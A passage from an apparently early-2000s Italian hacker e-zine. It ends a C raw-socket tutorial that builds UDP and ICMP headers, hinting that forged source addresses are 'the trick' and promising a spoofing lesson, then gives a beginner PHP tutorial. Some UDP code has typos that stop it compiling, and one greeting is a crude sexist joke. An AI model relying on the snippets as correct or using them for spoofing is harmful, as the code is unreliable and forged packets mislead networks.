  sum += (sum >> 16);                     /* add carry */
  answer = ~sum;          /* ones-complement, then truncate to 16 bits */

  return((u_short) answer);
}

----[UDP Header]----


Proseguiamo questa parte un po' noiosa ed analizziamo gli ultimi due protocolli
l'UDP e l' ICMP. Partiamo dal primo:

struct udphdr {
  u_int16_t	source;
  u_int16_t	dest;
  u_int16_t	len;
  u_int16_t	check;
};

(ricordo che quello che ho scritto qui sopra,come per gli altri protocolli, è
contenuto sotto usr/include/netinet,dateci un'occhiata).

Sinceramente non ricordo se negli altri tut ho parlato un po' nel dettagli
dell'UDP, quindi per non correre rishi ve lo spiego adesso!
A differenza del TCP è molto più semplice avendo solo 4 campi.
E' una cosa simile:

+----------------------------------------+
|   Source Port   |   Destination Port   |
+----------------------------------------+
|     Lenght      |       Checksum       |
+----------------------------------------+
|		Data                     |
+----------------------------------------+

Tutti i campi sono a 16 bit, tranne i Data ovviamente:-)

Vediamo anche qui come costruirlo:

innanzitutto le strutture dello pseudo header:

struct pseudohdr {
	unsigned long saddr;
	unsigned long daddr;
	char useless;
	unsigned char protocol;
	unsigned short lenght;
	}

Il pacchetto sarà così questo:

/* UDP */
struct udphdr *udp;
struct pesudohdr pseudo;

pseudo.saddr	=inet_addr("127.0.0.1");
pseudo.daddr	=inet_addr("127.0.0.2");
pseudo.useless	=htons(0);
pseudo.protocol	=IPPROTO_UDP;
pseudo.lenght	=(sizeof(struct udphdr);

udp->source	=htons(6969);
udp->dest	=htons(23);
udp->len	=htons(sizeof(struct(udphdr));
udp->check	=in_cksum((unsigned short *)&pesudo,sizeof(struct udphdr));

/* EOF */

Anche qui il checksum è calcolato come mostrato sopra.


----[ICMP]----

Ci resta ancora l' ICMP.
Per i dettagli tecnici vi rimando al tu di [V]lad.

struct icmphdr
{
  u_int8_t type;		/* message type */
  u_int8_t code;		/* type sub-code */
  u_int16_t checksum;
  union
  {
    struct
    {
      u_int16_t	id;
      u_int16_t	sequence;
    } echo;			/* echo datagram */
    u_int32_t	gateway;	/* gateway address */
    struct
    {
      u_int16_t	__unused;
      u_int16_t	mtu;
    } frag;			/* path mtu discovery */
  } un;
};

Vediamo come costruirci un ICMP message:

/* ICMP */

struct icmphdr *icmp;

icmp->type = ICMP_ECHO;	/* ECHO REQUEST */
icmp->code = 0; 	/* Id and sequence field significant*/

icmp->un.echo.id = 0;	/* to identify ping request */
icmp->un.echo.sequence = 0;	/* to identify ping reply */
icmp->checksum =0;
icmp->checksum = in_cksum((unsigned short *)icmp,sizeof(struct icmphdr));

/* EOF*/

Notiamo che il campo checksum deve essere 0 prima di essere calcolato e poi dopo
calcolato col solito algoritmo.

Se per caso volete già provare a pacioccare voi da soli vi ricordo che
dovete mettere come include:

#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/udp.h>
#include <linux/tcp.h>

Fate attenzione al campo udp perchè varia a seconda di alcune distro.
Potrebbe anche essere sotto ip_udp.h.
Potrebbe anche cambiare la dir sotto cui sono gli *.h.
Io li ho sotto <netinet/*.h>

----[End Theory]----

Con questo è tutto!
La parte sui raw socket teorica si conclude qui. Nulla di impossibile, vi pare?:-)
Vi butto solo lì una piccola cosa tanto da stimolarvi un po'...avete notato
che quando vi costruite i vari pacchetti inserite l'indirizzo IP di partenza e
la porta, vero?
Eheheheh...beh,il trucco è poi tutto lì:-)
Dovrei ancora parlarvi della frammentazione dei pacchetti,ma sinceramente so
ancora troppe poche cose e ve ne parlerò quando analizzeremo teardrop.c :-)

Con questo vi lascio e vi dò appuntamento al prox tut in cui finalmente
arriveremo a fare qualcosa di pratico! Dopo 4 tut tutti teorici forse è ora di
premere un po' i tasti della tastiera(voi...io li ho già premuti abbastanza!)
e di usare un po' di gcc :-)
Il prox tut sarà sullo spoofing vedente, spero di riuscire a scrivervelo
per dopo Natale!
Colgo quindi l'occasione per fare a tutti gli Auguri di un buon Natale e
di iniziare l'anno nuovo con una bella sbronza e, perchè no, tra le tette di una
topa più ubriaca di voi;-)

<<<<<<<<<<<HaCk tHE PlaNeT>>>>>>>>>>>>

Ringraziamenti: tutto la crew NoFlyZone e i visitatori del chan #noflyzone,
		in particolare Vicio, Crashes, Deli, [V]lad, Pit, BIGA,
		XpTerminator, Zuccherina83 e tutti quelli che ho dimenticato.

Saluti: voglio salutare i ragazzi di Security Sistem...ho appena finito oggi di
	leggere il 3° numero della zine e devo proprio farvi i complimenti!
	Saluto anche tutti quelli di OndaQuadra e di BFI!

Fonti:	TCP/IP Illustrated 1,2 di Stevens (grazie biblio del Poli) e lo
	scritto di Exile 2000.

Fuck: sotto Natale siamo tutti più buoni quindi a nessuno:-)

Bye bye a tutti!:-)


------------------------------------*END*--------------------------------------

------------------------------------[19]---------------------------------------
-----------------------------------[pex3]--------------------------------------
------------------------------------[PHP]--------------------------------------

jan 2002
 -----
-H2K^2-  ______  ____  __  __   ____
 -----   \  __ \/ __ \/  \/  \ /_   \
          | \_\   ___/\      <  _<  /
          |  __/\___  >__/\  / \__  /
          | |       \/     \/     \/
         /__|      WEB:
                 http://www.pex3.com
                  ------------------
                   E-MAIL:
                 pex3@fuckwindows.com
                  -------------------
                   IRC: #NoFlyZone #ubrihackers
                 #smanettoni #rotfl #hack #php
                   #hackmaniaci #italia-underground
                 #hackarena #linux-club #linux-maina
                   #opensource #spippolatori #ondaquadra
                   irc.azzurranet.org:6667
                  -----------------------


----------------------------------------------------------------- Intro: --
Autore: pex3
E-mail: pex3@fuckwindows.com
Sito: http://www.pex3.com/
IRC: irc.azzurranet.org:6667 #NOFLYZONE
Dedicated to: Charlie
Date: January 2002
Text License: GNU GENERAL PUBLIC LICENSE Version 2

Al Suono di...
House of Glass - Disco Down                  The Best Dance Music Selected
Prezioso Feat. Marvin - Tell Me Why                                by pex3
Gigi D'Agostino - Another Way
Gigi D'Agostino feat. Edoardo Bennato - Un Giorno Credi
DeeJay Parade 2002

-------------------------------------------------------------- About PHP: --
Il sito di principale su cui trovare tutte le informazioni su PHP è:
	http://www.php.net

PHP (Personal Home Page tools, così chiamato perchè l'autore, Rasmus
Lerdorf, lo aveva dapprima sviluppato per uso privato per la sua homepage)
è un linguaggio di scripting dal lato server (server-side) integrabile
direttamente nel codice HTML.
L'ultima versione ad oggi del php parser è la 4.0.6 quindi farò riferimento
ad essa, che è anche la più diffusa.

-------------------------------------------------------------- Vantaggi: --
I principali vantaggi di PHP sono:
- l'interprete PHP (o processore di hypertesto PHP o parser) può essere
  integrato facilmente nel web server Apache come modulo ed è
  piuttosto leggero, in confronto ad altri tool.
- è disponibile gratuitamente (i dettagli della licenza li trovate sul
  sito ufficiale , oppure nel file LICENSE della distribuzione in
  sorgente).
- funziona sui sistemi UNIX (Linux compreso) ed anche sui sistemi
  Windows, permettendovi così di portare facilmente gli script da
  un ambiente all'altro.
- è già fornito di tutte le librerie per accesso ai database più
  comuni e di tutte le funzioni per la gestione dei cookies, delle
  sessioni di navigazione, per l'utilizzo di protocolli di rete,
  per la generazione dinamica delle immagini (le librerie grafiche
  del formato gif sono a pagamento, perchè gif è un formato
  proprietario, mentre sono gratuite per jpg e png) e di tutto quello
  di cui avete bisogno per programmare pagine web dinamiche anche
  complesse con poca fatica .
- facilita il debugging: fa uscire gli errori direttamente sulle
  pagine web e/o nell'errorlog, indicando chiaramente il tipo di
  errore, il percorso completo dello script che ha generato
  l'errore e il numero di riga su cui si è fermato il parser.
- può essere utilizzato anche come linguaggio di scripting al
  di fuori del web, ad es. per produrre script destinati ad essere
  chiamati dalla shell. Basta compilarne la versione CGI.

Per queste ragioni, sempre più siti scelgono PHP come tecnologia di
scripting. PHP è la tecnologia alternativa ad ASP (Active Server Pages) di
Microsoft con la differenza che mettere su un server web con Linux, Apache,
MySQL (o PostgreSQL) e PHP non costa nulla in termini di software ed offre
spesso performances migliori, più stabili e più sicure di molti altri blasonati
software proprietari.

Con PHP si possono fare non solo manipolazione di database tramite
interfaccia web e report (anche grafici) di dati di un database, ma anche
cose divertenti, come sondaggi online, forum, chat, giochi, contatori,
scanner, interfacce per l'upload da web, etc...

L'installazione e la configurazione di PHP, di Apache, di mSQL o MySQL è un
argomento complesso ed al di fuori degli scopi di questo tutorial. Ogni
pacchetto contiene la documentazione e le istruzioni per l'installazione e
consiglio caldamente di prendersi il tempo e la pazienza di consultarla.

Se avete problemi di installazione, consiglio di leggere le FAQ:
	http://www.php.net/FAQ.php

per vedere se è già stata data una risposta al vostro problema. C'è anche
una mailing list con archivi nel sito http://www.php.net.

Se invece avete un amministratore di sistema che fa tutto per voi (se siete
così fortunati), allora potete passare subito al paragrafo successivo.

------------------------------------------------------ Formati dei file: --
Molti lo danno per scontato, ma un newbie non sa che estensione deve avere
il programma che scrive e non sa nemmeno come trasformarlo in un programma
che funzioni (fase detta di compilazione).
Gli script php possono essere salvati con i seguenti nomi:
	- file.php
	- file.phtml
	- file.php3
	- file.php4
	  etc...

Le estensioni sono davvero molte, le prime due sono le piu' comuni, le altre
due servono per dire al server che versione del php utilizzare (risp. 3 o 4)
ma se avete un server vostro potete decidere voi che estensioni utilizzare
(per es. anche .html), ma questo esula dall'obbiettivo di questa guida.
Io consiglio di usare la prima perchè è sicuro che funziona su tutti i
server, o quasi...
Esiste poi un'altra estensione che dice al server di non processare il file
e restituirne quindi il codice sorgente:
	-file.phps

infatti phps sta per phpsource. Io uso per questo obbiettivo la più comune
.txt senza complicare la vita al php.ini :-)


--------------------------------------------- Iniziamo con lo Scripting: --
Come tradizione universale, il primo programma che un principiante deve
scrivere è Hello World. Il mio primo programma in assoluto era un "hello
world" in html, non era un vero programma, però era il primo. :)
Questo banale programma vi permetterà di verificare la correttezza
dell'installazione di Apache e PHP:

<HTML>
 <HEAD>
  <TITLE>Hello World!</TITLE>
 </HEAD>
<BODY>
 <?php echo "Hello World!"; ?>
</BODY>
</HTML>

Salvate questo codice nel file hello.php da qualche parte accessibile via
web e poi con un qualunque browser (lynx o netscape sono popolari in Unix),
andate all'URL corrispondente, che sarà ovviamente del tipo:

	http://hostname/percorso/prova.php

Nel mio caso, la Document Root di Apache è impostata a:
	/usr/local/apache/htdocs/

ed ho messo prova.php in quella directory. Quindi da web si vede come:
        http://localhost/prova.php

Se il vostro computer non è connesso a nessuna rete, oppure non avete
ancora impostato un nome di host, allora mettere localhost al posto di
hostname.

In caso di errore: ammesso che l'installazione di php sia corretta,
ricordatevi anche che nei sistemi Unix ci sono le permission sui file e
quindi occorre assicurarsi che l'utente sotto cui gira il server web possa
leggere il file prova.php. Ricordo che il comando per cambiare i permessi è
chmod(1), quello per cambiare possessore e gruppo di un file è chown(1).

Dovreste vedere una pagina di questo tipo (con lynx):

                                                                Hello World!

   Hello World!

In alto a destra c'è il titolo della pagina, mentre la prima riga consiste
in quello che ha prodotto lo script: la stampa della stringa "Hello
World!".

Il vantaggio sintattico di usare PHP per la programmazione CGI, rispetto a
linguaggi classici come il C/C++ o il Perl è che non bisogna utilizzare una
miriade di istruzioni di stampa (print, printf, puts, cout<< e simili) per
fare l'output di codice HTML. Il processore PHP riporta al server web
Apache tutto il codice al di fuori dei tag <?php, ?> esattamente come lo
scrivete, mentre le parti che si trovano tra i tag <?php, ?> vengono
interpretate e poi sostituite con l'eventuale output che generano, se ci
sono delle istruzioni di stampa.

In questo senso si dice che PHP è "embedded in HTML", proprio come
JavaScript, con la differenza però che JavaScript è un linguaggio lato
client, mentre PHP viene elaborato dal lato server. Un'altra differenza è
che, essendo embedded e dovendo essere interpretato dal client, JavaScript
è visibile all'utente (basta guardare i sorgenti della pagina html), mentre
PHP no: se visualizzate il sorgente della pagina prova.php ecco cosa
vedrete:

<HTML>
 <HEAD>
  <TITLE>Hello World!</TITLE>
 </HEAD>
<BODY>
 Hello World!</BODY>
</HTML>

Nota: per visualizzare il sorgente di una pagina, con Netscape per Unix
andate nel menù View e scegliete Page Source oppure premete <Alt>U e si
aprirà una nuova finestra, con lynx il tasto \ fa passare al sorgente e
viceversa.

Come vedete l'utente non ha modo di conoscere il vostro codice PHP, poichè
non ha modo di impedire ad Apache di non processare un file .php col
processore PHP.

Potete configurare Apache in modo che tutti i file html siano processati
con PHP e non solo quelli con estensione PHP. Se fate questo tuttavia,
probabilmente introducete un carico maggiore sul server, a meno che non
servite tutte pagine PHP; generalmente conviene far sì che solo le pagine
con estensione .php siano passate tramite il processore PHP, mentre le
pagine statiche no; il semplice passaggio di una pagina statica per il
processore PHP è innocuo: esso non trova alcuna sezione PHP da interpretare
e ritorna la pagina esattamente come gli viene trasmessa, con un perfetto
spreco di cicli di CPU.

Naturalmente al posto di .php potete scegliere una estensione qualunque
(.cgi, .script o quello che vi pare!): configurando il server web in questo
modo l'utente non ha modo di sapere se state usando php o qualche altro
tool. Anzi il solo fatto che un sito abbia pagine che finiscono in .php non
implica necessariamente che sta usando php! Meglio comunque usare .php
come estensione per le pagine .php, non c'è ragione di nascondere l'uso di
php, visto che è gratuito, no? ;)

E' opportuno indentare opportunamente il codice html per migliorarne la
leggibilità e questo vale ancor di più quando ci sono degli script dentro.
Nel caso di Hello Word, è meglio aggiungere un accapo:

<?php echo "Hello World!\n"; ?>

Notate quindi che ora viene prodotto un accapo nell'html generato:

<HTML>
 <HEAD>
  <TITLE>Hello World!</TITLE>
 </HEAD>
<BODY>
 Hello World!
</BODY>
</HTML>

Se non volete usare la sequenza di escape \n, in questo caso, basta
aggiungere una riga vuota dopo la sezione PHP per ottenere lo stesso effetto:

<BODY>
 <?php echo "Hello World!"; ?>

</BODY>

E' comune adottare anche questi stili di indentazione, per distinguere
meglio il codice PHP da quello HTML:

<BODY>

 <?php echo "Hello World!"; ?>

</BODY>


<BODY>

 <?php
	echo "Hello World!";
 ?>

</BODY>


<BODY>
 <?php

	echo "Hello World!";

 ?>

</BODY>

Quest'ultima forma è per me preferibile poichè non introduce nel codice HTML
finelinea in più, ed evidenzia bene l'inizio e la fine del codice PHP
rispetto all'HTML, ma in questo campo non ci sono regole, solo preferenze.

Avrete quindi capito che per programmare in PHP basta un browser web e un
normale editor di testo, quale vi(m) o emacs, non è necessario acquistare
costosi e pesanti sistemi di composizione visuale del codice che promettono
quello che poi non possono essere in grado di mantenere. Nei casi più
difficili infatti occorre sempre conoscere i linguaggio e mettersi a
scrivere il codice e codificare algoritmi. Non esistono scappatoie: nessun
sistema visuale può generare tutto il codice per voi. Se così fosse tutti i
programmatori perderebbero il lavoro (o si metterebbero a fare questi tool
miracolosi anzichè pagine web). Gli ambienti integrati possono essere
utili per riunire in un unico posto tutti gli strumenti che il
programmatore deve usare; ma sono solo un'interfaccia: non c'è niente di
magico. A maggior ragione occorre sapere bene quello che si sta facendo.

Il sorgente php, oltre che essere racchiuso tra i tag:
	<?php ?>

può anche essere racchiuso tra i tag più brevi:
	<? ?>

oppure tramite il tag <script> standard di html:
	<script language="php"> </script>

Poichè però i tag <? ?> sono usati da XML, non potete usarli se volete
usare XML in combinazione con PHP pena ambiguità ed errore e dovete quindi
editare il file di configurazione /usr/local/lib/php.ini, inserendo Off al
posto di On nella riga:

; allow the <? tag.  otherwise, only <?php and <script> tags are recognized.
short_open_tag  =       On

oppure, passate l'opzione --disable-short-tags al configure nella fase di
installazione.

Personalmente preferisco usare <?php, ?>  oppure <%, %> che non danno
problemi nel caso di futura conversione di un documento HTML in XML
(non si sa mai).

Dalla versione 3.0.4, PHP supporta anche i tag in stile ASP, che sono:

<% %>
<%= %>

Quindi avremmo potuto scrivere:

<% echo "Hello World!"; %>
oppure equivalentemente:
<%= "Hello World"; %>

molto comodo il secondo tipo. Notare che le virgolette doppie sono
necessarie per quasi tutte le stringhe. Potrebbero non esserlo nel caso di
stringa composta da una sola parola, ma, se questa corrisponde ad una
parola chiave del php, il parser si inganna, quindi meglio usarle SEMPRE.

Il punto e virgola finale, poichè c'è una sola istruzione, non è
necessaria, ma io preferisco usarlo sempre. Più precisamente il ; finale è
opzionale dopo l'ultima istruzione, ossia prima di ?> e simili. Non è
obbligatorio lo spazio dopo <?, <%, <%= o prima di %>, ?>, ma io preferisco
usarlo sempre, perchè penso migliori la leggibilità.

Comunque per poter usare i tag stile asp occorre abilitarne il
riconoscimento in php.ini, mettendo un On al posto di Off nella seguente
riga:

asp_tags                =       Off ; allow ASP-style <% %> tags

Se avete compilato PHP come modulo, dopo una modifica al file di configurazione
di php, dovete riavviare apache per renderla effettiva, poichè per ragioni
di efficienza  il file di configurazione di php viene letto solo una volta
quando apache si avvia e i suoi settings vengono mantenuti in memoria, anzichè
essere riletto ogni volta che si accede ad una pagina php come con la versione
CGI di PHP. Fate quindi:
	/usr/local/apache/bin/apachectl graceful

oppure:
	/usr/local/apache/bin/apachectl restart

La funzione echo è l'istruzione di output più semplice e più usata.
Attenzione però che in realtà non è una vera e propria funzione come quelle
che può definire l'utente, ma piuttosto un costrutto cablato nel
linguaggio, e per ciò non si deve racchiudere la lista dei suoi argomenti
tra ( ), nel caso fossero più d'uno:

<% echo("Hello", " World!"); %>
è un errore, scrivete invece:
<% echo "Hello", " World!"; %>

Andando a capo nel mezzo di una stringa produce lo stesso effetto di
inserire il carattere newline (\n) nella stringa, quindi

<PRE>
<%
echo "Is There
Anybody
Out There?"
%>
</PRE>

è lo stesso di:

<PRE>
<% echo "Is There\nAnybody\nOut There?" %>
</PRE>

Quando usate i tag <%=, %>, potete inserire più espressioni-istruzioni,
separandole tramite ";", ma solo la prima espressione valutata sarà
implicitamente stampata:

ES.

<%= php; " is great"; %>
 produce in output solo:
php

<%= php; echo " is great"; %>
 produce:
php is great

<%= "alpha", 77 %>
 produce:
alpha77

come osservato prima qui l'uso delle " attorno alla stringa "php" sarebbe
consigliabile.

L'ultimo esempio mette in evidenza che:

<%= ... %>

è una forma sintattica abbreviata equivalente a:

<%echo ... %>

e quindi potete avere più espressioni argomento separate da virgola che
vengono tutte valutate e stampate in sequenza, esattamente come quando
fornite parametri al comando echo. Anche qui è un errore racchiudere i
parametri tra ( ).


-------------------------------------------------------------- Commenti: --
Si possono inserire commenti multilinea nel codice racchiudendoli tra /* e
*/ come in C, oppure commenti fino alla fine della linea (o del codice PHP,
a seconda di quello che viene prima), iniziandoli con // in stile C++,
oppure con # come nei linguaggi delle shell di Unix (o come in Perl). Ecco
degli esempi dei tre stili di commento possibili:

<%
   /*
      commento multilinea;
      i commenti multilinea non si possono annidare
         (non avrebbe nemmeno molto senso farlo)
   */

  echo "linea di codice con commento";  // commento
  echo "commento in stile Perl";        # commento
%>

Queste quattro sezioni di codice php che presentano un commento di linea
che termina con la sezione stessa sono tutte corrette:

<PRE>
<?php echo "commento1"; # commento1 ?>

<?php echo "commento2"; // commento2 ?>

<? echo "commento3"; # commento3 ?>

<? echo "commento4"; // commento4 ?>
</PRE>

Di queste tre invece solo la prima è vista correttamente dal parser:

<PRE>
<% echo "commento1"; /* commento1 */ %>

<% echo "commento1"; # commento1 %>

<% echo "commento2"; // commento2 %>
</PRE>

Se si va accapo prima di %> anche le ultime due sono corrette. Non c'è
motivo per cui le ultime due non dovrebbero essere accettate. Si tratta di
una limitazione (dovuta a dimenticanza) nel codice del parser che gestisce
i commenti fino alla fine delle linee (che non tiene conto di %> e lo
considera parte del commento). Probabilmente sarà corretta nelle prossime
versioni, anzi sicuramente sarà corretta, (informazioni all'url:
http://bugs.php.net/?id=8203).
Questo per dire che se trovate bachi in PHP non dovete attendere anni
finché vengano corretti. Vantaggi evidenti dell'open source, che è in grado
di produrre software maggiormente stabile rispetto a quello commerciale.


--------------------------------------------- Variabili e tipi numerici: --
Come accade in altri linguaggi di scripting e interpretativi e al contrario
del C (che è prevalentemente compilato), in PHP non si dichiarano le
variabili (per lo meno quelle "normali") e per rendere la vita facile al
parser tutti i nomi di variabile vanno prefissati con un simbolo, che è $.
Poichè non esiste una dichiarazione di variabile, come si fa allora a
stabilire il tipo di una variabile? Alcuni linguaggi usano simboli diversi
davanti al nome della variabile per indicarne ogni volta il tipo. In PHP
invece si usa sempre solo $ davanti ai nomi delle variabili e il tipo di
una variabile viene determinato automaticamente dall'interprete a seconda
del contesto in cui la variabile viene usata.

Questo in particolare significa che se assegnate un intero ad una variabile
essa sarà intera, se gli assegnate una stringa sarà una stringa, ecc...:

<%
   /* output:

	integer<br>
	string<br>
	string
   */

   $num = 56;
   echo gettype($num), "<br>\n";

   $str = "cinquantasei";
   echo gettype($str), "<br>\n";

   $num = $str;
   echo gettype($num);
%>

Se avevate assegnato un intero e poi assegnate una stringa, il tipo della
variabile cambierà e diventerà una stringa e viceversa, e così anche per
tutti gli altri tipi. Questa flessibilità è tipica dei linguaggi
interpretativi.

PHP è case sensitive nei nomi di variabile, come il C e quindi la variabile
$FOO è diversa da $Foo o da $FoO. Tuttavia PHP non fa differenza di case
tra le parole riservate e i nomi di funzione: while, WHILE, While, WhIlE,
ecc.. sono tutte la stessa parola riservata, il che vi permette di
scegliere liberamente lo stile che preferite. Qualunque sia lo stile che
scegliate, consiglio tuttavia di essere consistenti.

Un nome di variabile valido deve iniziare con una lettera o con il
carattere di underscore e può comprendere altre lettere e cifre, il
carattere di underscore. I caratteri ascii dal 127 al 255 sono considerati
lettere, quindi anche le lettere accentate dell'italiano possono fare parte
di nomi di variabile. Comunque questi codici di caratteri non sono
standard.

L'interprete mantiene una tabella con nomi, valori e tipi delle variabili e
potete chiedergli il tipo di una variabile usando la funzione:
	string gettype (mixed var)

questa ritorna una stringa identificativa del tipo come nell'esempio
precedente ed accetta per argomento una variabile di tipo qualsiasi.

Le costanti intere possono essere indicate, oltre che nella normale base
10, anche in ottale o in esadecimale, secondo una sintassi identica a
quella del C. Ecco degli esempi tratti dal manuale:

$a = 1234; # numero decimale
$a = -123; # un numero negativo
$a = 0123; # numero ottale (equivalente al decimale 83)
$a = 0x12; # numero esadecimale (equivalente a 18 decimale)

Un intero ha sempre il segno; la dimensione è dipendente dal sistema
utilizzato; di solito il range per gli interi è quello che si può
rappresentare in complemento a 2 con registri di macchina a 32 bit:
	[-2^31=-2147483648, 2^31-1=2147483647]

Le variabili in virgola mobile hanno un tipo detto "double" (così come
ritornato da gettype) e si possono indicare nelle forme usuali (notazione a
punto fisso ed esponenziale):

$a = 1.234;
$a = 1.2e3;
$a = 1.;	// $a vale 1.0
$a = .5;	// $a vale 0.5

nell'ultimo esempio ho scritto "1." invece di "1" per forzare il tipo a
double (altrimenti l'interprete avrebbe stabilito il tipo di $a come
integer).  Avrei anche potuto scrivere 1.0 o 1.00, ecc..

Un modo più generale di forzare il tipo di una espressione effettuando
una conversione al tipo voluto, se necessario, consiste nell'usare
l'operatore di casting, che come in C ha la forma:
	(tipo_voluto)(espressione di cui forzare il tipo)

Ad es. per ottenere la parte intera di un numero double $a, scriveremo:

$int_a = (integer)$a;

la keyword "integer" può essere abbreviata in "int":

$int_a = (int)$a;

Supponendo sia stato fatto $int_a = 10;, le istruzioni:

$a = $int_a;
$a = (double)$int_a;

sono leggermente diverse: la prima assegna il tipo integer e il valore 10
ad $a. La seconda gli assegna ancora il valore 10, ma il tipo è double.

Sinonimi di (double) sono (real), (float). Personalmente preferisco usare
sempre solo (double).

Esiste anche la funzione inversa di gettype:
	int settype (string var, string type)

che converte la variabile di nome var nel tipo type che può essere una
delle seguenti stringhe:

     "boolean"
     "integer"
     "double"
     "string"
     "array"
     "object"

ES.

$a = 10.6;
settype($a, integer);	# $a adesso è un intero e vale 10

E' possibile non racchiudere la stringa che rappresenta il nome del tipo
tra "" con la funzione built-in settype, tuttavia non sempre (non nel caso
di array, poichè array è anche il nome di un altro costrutto che vedremo).
La funzione settype svolge un lavoro identico alla seguente assegnazione:

$a = (type)$a;

Una variabile che viene usata senza prima essere inizializzata non contiene
alcun valore, non essendo presente nella tabella dei simboli
dell'interprete e, ad es.,  stamparla su output non produce nulla. Il suo
tipo è nessuno, infatti la funzione gettype ritorna la stringa "NULL".

<%
   echo $var;		// non stampa niente
   echo (int)$var;	// stampa 0
   echo gettype($var) 	// stampa NULL
%>

Consiglio di inizializzare le vostre variabili prima di usarle con un
valore del tipo che volete assegnare a quella variabile, oppure almeno
stabilitene il tipo tramite settype. settype inizializza integer e double
non definiti a 0 e le stringhe a stringhe vuote:

<%
   settype($var, integer);
   echo $var;	// stampa 0;
%>

Per sapere se una variabile è presente nella tabella dei simboli
dell'interprete potete utilizzare la funzione:
	int isset (mixed var)

la quale restituisce true se la variabile esiste, false altrimenti.
La funzione:
	int unset (mixed var)

libera tutta la memoria associata alla variabile indicata (se non vi sono
altri riferimenti alla variabile - vedi capitolo "Riferimenti e Variabili
variabili") e la toglie dalla tabella dei simboli dell'interprete. Dopo
aver fatto l'unset di una variabile, finchè non la si inizializza o non se
ne setta il tipo, isset su quella variabile varrà sempre false. La funzione
unset ritorna sempre true in questo caso.

In PHP esiste il tipo boolean e l'insieme dei suoi valori sono le costanti
predefinite true e false:

<%
$a=true;
echo gettype($a);	// stampa boolean
echo gettype(false);	// stampa boolean
echo true;		// stampa 1
echo false;		// non stampa niente
// stampa 1: ogni intero !=0 usato come boolean è considerato vero
echo (boolean)-1;
%>

Potete scrivere queste costanti col case che volete: TRUE, true, True,
tRUe, ecc.. sono tutte la stessa costante. Tuttavia PHP non ha un tipo
booleano dedicato, similmente al C e al Perl e a differenza del Pascal:
questo è conveniente poichè ogni valore (numerico e anche non numerico) può
essere usato direttamente come valore di verità: è considerato vero se è
diverso da zero (anche se negativo), falso se uguale a zero. La stringa
vuota ("") e la stringa con la cifra zero ("0") valgono false in termini
booleani; tutte le altre stringhe valgono true. Un array vale false solo se
vuoto, true altrimenti.

Gli usuali operatori aritmetici +, -, *, / si applicano sia agli integer
che ai double. Se uno degli operandi è un double, il risultato sarà double;
se entrambi sono integer il risultato sarà intero.

Il manuale dice che la divisione / è una divisione intera e ritorna un
intero se i due operandi sono interi (o stringhe che vengono convertite ad
interi), mentre se uno degli operandi è un numero a virgola mobile, viene
effettuata la divisione tra double.

In realtà che le cose non stanno proprio così e che viene effettuata la
divisione decimale anche quando ci sono due operandi interi non divisibili.
Se volete sempre la divisione intera, è consigliabile fare un cast:

$a=10; $b=3;
$c = $a / $b;
echo $c;	// stampa 3.3333333333333
$c = (int)($a / $b);

echo $c;	// stampa 3

L'operatore modulo % restituisce il resto della divisione intera
tra gli operandi e restituisce quindi sempre un integer. Eventuali
argomenti double vengono troncati e convertiti ad intero.

Tutti gli operatori aritmetici possono essere combinati con l'operatore di
assegnamento esattamente come in C:

$a += $b	<=>	$a = $a + $b
$a -= $b	<=>	$a = $a - $b
$a *= $b	<=>	$a = $a * $b
$a /= $b	<=>	$a = $a / $b
$a %= $b	<=>	$a = $a % $b

integer e double possono essere confrontati con gli usuali operatori
relazionali <, >, <=, >=, ==, !=, la cui sintassi è identica a quella del
C. Dal C, PHP prende a prestito anche l'operatore ternario ?:, la cui
sintassi consigliata è:

 (expr1) ? (expr2) : (expr3);

questo operatore permette di effettuare una selezione di due espressioni
(expr2 ed expr3), in base al valore di verità (rispettivamente true e
false) della prima. L'operatore valuta e ritorna il risultato
dell'espressione selezionata, che può a sua volta far parte di una
espressione. Quando avete dubbi sulla precenza di ?:, potete racchiudere
tutta l'espressione ternaria tra parentesi (in ogni caso, vedi in seguito
per la tabella delle precedenze degli operatori).

ES.
assegna a $max il valore massimo tra $a e $b:
$max = ($a>$b) ? ($a) : ($b);

PHP mette disposizione la funzione matematica max che restituisce il
massimo di una serie di valori di lunghezza arbitraria e la sua controparte
min per il minimo. Entrambe le funzioni possono confrontare interi, double
e stringhe.

Come in C, un assegnamento è una espressione che ritorna il valore
assegnato e l'operatore = (da non confondersi con ==), è associativo da
destra verso sinistra. Quindi as es.:

$a = $b = 3	<=>	$b=3; $a=$b

Anche gli operatori unari di incremento e decremento seguono la stessa
sintassi e semantica del C. Ad. es. un operatore ++ postfisso incrementa di
1 l'integer a cui si applica, ma restituisce il valore prima
dell'incremento, mentre il ++ prefisso incrementa di 1 e restituisce il
valore incrementato. Questi operatori permettono di incrementare o
decrementare dell'unità delle variabili all'interno della valutazione di
una espressione.

ES.
$a=6;
echo $a++ . "<br>\n";	// stampa 6
echo $a;		// stampa 7

++ e -- incrementano/decrementano di 1 anche i double in PHP.

Naturalmente si devono applicare a delle variabili. Non ha senso scrivere
cose del tipo ++5.

Associatività e precedenza degli operatori è espressa da questa tabella,
tratta dal manuale di PHP, in cui gli operatori più in basso hanno sempre
precedenza MAGGIORE rispetto a quelli listati primi. Operatori con lo
stesso livello di precedenza, ossia listati sulla stessa riga, in mancanza
di parentesi che forzino un ordine diverso, si associano come indicato
nella prima colonna (ammesso che si possono associare, altrimenti è
indicato "non-associative"):

Operator Precedence
----------------------------------------------------------------------------
 Associativity		Operators
 left			,
 left			or
 left			xor
 left			and
 right			print
 left			= += -= *= /= .= %= &= |= ^= ~= <<= >>=
 left			? :
 left			||
 left			&&
 left			|
 left			^
 left			&
 non-associative	== != === !==
 non-associative	< <= > >=
 left			<< >>
 left			+ - .
 left			* / %
 right			! ~ ++ -- (int) (double) (string) (array) (object) @
 right			[
 non-associative	new
----------------------------------------------------------------------------
Nota: alcuni di questi operatori saranno trattati in seguito

------------------------------------------------------------ Conclusioni: --
Eccoci giunti alla fine della prima parte della mia guida al php, ovviamente
aspetto le vostre segnalazioni nel caso di presenza di errori: saranno
patchati immediatamente ;-) e siccome non sono mai stato bravo a fare gli
addii non lo farò... anche perchè non parto! ;)
A presto arriverà anche la seconda parte, trateerà di:
-  funzioni dei socket,
-  funzione date(),
-  accedere al fyle system,
-  gestione dei cookie,
-  sorpresa! :-)

----------------------------------------------------------- Fuck & Greet: --
fuck a:
- tutti i lameri (anche se alcuni sono davvero buffi),
- la gdf (guardia di finanza) che ogni spesso chiude qualche sito
  underground/warez e/o amici/conoscenti :-( (lutto per: feltonspray, mr.wolf,
